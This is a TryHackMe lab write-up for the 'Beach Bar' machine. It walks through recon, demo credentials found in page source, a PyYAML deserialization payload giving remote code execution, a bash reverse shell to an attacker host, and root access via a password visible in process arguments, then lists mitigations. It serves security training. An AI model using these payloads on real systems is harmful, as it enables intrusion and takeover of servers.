# Beach Bar - TryHackMe Write-up

A detailed write-up on how to solve the **Beach Bar** machine on TryHackMe. This lab covers reconnaissance techniques, exploiting **Insecure Deserialization** in Python (`PyYAML`), and privilege escalation by enumerating exposed root processes.

* **Author:** HackSysX70
* **Platform:** TryHackMe
* **Difficulty:** Easy
* **OS:** Linux

---

## 1. Reconnaissance (Recon)

We begin by performing a full port scan on the target machine using **Nmap** to identify open ports, running services, and potential entry vectors.

```bash
nmap -p- -sS -T4 -Pn -n -vvv -sVC <TARGET_IP> -oN scan.txt
```

### Explanation of Parameters Used

| Parameter | Description |
| :--- | :--- |
| `-p-` | Scans **all 65,535 TCP ports** to ensure no services running on non-standard ports are missed. |
| `-sS` | Performs a *SYN Stealth* scan (half-open), which is fast and does not complete the full TCP 3-way handshake. |
| `-T4` | Sets the timing template to level 4 (aggressive) to speed up the scan in stable lab environments. |
| `-Pn` | Treats the host as online, **skipping ICMP ping discovery** in case a firewall blocks ping requests. |
| `-n` | Disables DNS name resolution, significantly reducing overall scan time. |
| `-vvv` | Enables maximum verbosity to display open ports in real-time as they are discovered. |
| `-sVC` | Combines `-sV` (service version detection) and `-sC` (default NSE scripts for common vulnerabilities). |
| `-oN scan.txt` | Saves the complete output in normal format into `scan.txt` for future reference. |

### Scan Results Summary

| Port | State | Service | Details |
| :--- | :--- | :--- | :--- |
| **22/TCP** | Open | `ssh` | SSH Service |
| **80/TCP** | Open | `http` | HTTP Service (Web Server) |

---

## 2. Web Enumeration

Upon accessing `http://<TARGET_IP>` through a web browser, we land on the Beach Bar application interface. Inspecting the **HTML page source code** thoroughly, we locate a critical development comment (*Staff Note*) left in production:

```text
staff note: the demo DJ login is still enabled for the soft opening.
dj / dj  -- swap this before the season starts (ticket BAR-7)
```

### Discovered Credentials

| Role / Context | Username | Password | Source |
| :--- | :--- | :--- | :--- |
| Demo DJ Account | `dj` | `dj` | HTML Source Code Comment |

Using these exposed credentials, we successfully authenticate into the web platform.

---

## 3. Exploitation (Gaining Initial Access)

Once authenticated, we find an **Import Playlist** feature that accepts data files in **YAML** (`.yml`) format.

### Vulnerability Analysis: Python YAML Deserialization
Python web applications commonly use libraries like `PyYAML` to parse YAML files. If the backend relies on the unsafe `yaml.load()` method instead of `yaml.safe_load()`, the parser processes native Python object tags (`!!python/object/apply`). This introduces an **Insecure Deserialization** vulnerability that leads directly to Remote Code Execution (RCE).

### Proof of Concept (PoC)
To confirm command execution, we inject a YAML payload invoking `subprocess.check_output` to execute the `id` command via Bash:

```yaml
!!python/object/apply:subprocess.check_output
- ["bash", "-c", "id"]
```

Upon submitting the payload, the web application reflected the system user's context (`bartender`), confirming active RCE.

### Catching the Reverse Shell
First, we set up a **Netcat** listener on our attacker machine on port `4444`:

```bash
nc -lvnp 4444
```

| Parameter | Description |
| :--- | :--- |
| `-l` | Puts Netcat into **listen mode** to wait for incoming connections. |
| `-v` | Enables verbose output to show connection details in the terminal. |
| `-n` | Disables DNS resolution on incoming IP addresses for faster connection handling. |
| `-p 4444` | Specifies local TCP port `4444` to listen on. |

Next, we injected the following modified payload into the YAML import feature using `subprocess.Popen` to establish an interactive Bash reverse shell back to our listener:

```yaml
!!python/object/apply:subprocess.Popen
- ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"]
```

> **Tip:** The Linux `/tmp` directory can be utilized when transferring auxiliary enumeration tools because it grants universal write permissions (`sticky bit`) to any low-privileged user.

As soon as the YAML payload was processed, we caught the reverse shell as `bartender` and read the user flag:

```bash
cat /home/bartender/user.txt
```

* **User Flag:** `THM{REDACTED_USER_FLAG}` *(Hidden in accordance with TryHackMe write-up policies).*

---

## 4. Privilege Escalation

Operating inside the system as the low-privileged `bartender` user, we initiated local enumeration to identify a path to escalate privileges to `root`.

### Process Enumeration
To avoid parsing hundreds of irrelevant OS background processes, we queried active processes filtered specifically for full command-line arguments running under the `root` user:

```bash
ps -f -u root
```

| Parameter | Description |
| :--- | :--- |
| `-f` | Displays **full-format listing**, revealing the exact command-line arguments passed to each running process. |
| `-u root` | Filters the output to show only processes owned and executed by the `root` user. |

### Vector Discovery
Reviewing `root`'s active processes, we spotted a custom Python daemon managing the application's music backend (`jukeboxd.py`). The administrator made the severe mistake of passing the service password as a plain-text argument directly in the command line:

```text
root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024!
```

### Gaining Root Access
Using the exposed credential (`SunsetSpritz2024!`), we switched to the `root` user account:

```bash
su root
```

After entering the password, we obtained a full administrative shell as `root` and retrieved the final flag:

```bash
cd /root
cat root.txt
```

* **Root Flag:** `THM{REDACTED_ROOT_FLAG}` *(Hidden in accordance with TryHackMe write-up policies).*

---

## 5. Conclusions and Mitigation

1. **Prevent Insecure Deserialization:** Never pass untrusted user input to `yaml.load()` in Python. Always use **`yaml.safe_load()`**, which restricts parsing to basic data types (strings, integers, lists, and dictionaries) and blocks arbitrary Python object instantiation.
2. **Avoid Plain-Text Credentials in Process Arguments:** Command-line arguments are visible to all local users via `ps` or `/proc`. Passwords and API tokens should be stored in restricted configuration files (`chmod 600`) or injected via secure environment variables.
3. **Remove Development Comments Before Production:** Audit HTML templates and client-side code prior to deployment to ensure debug notes, ticket references, and temporary credentials are completely removed.
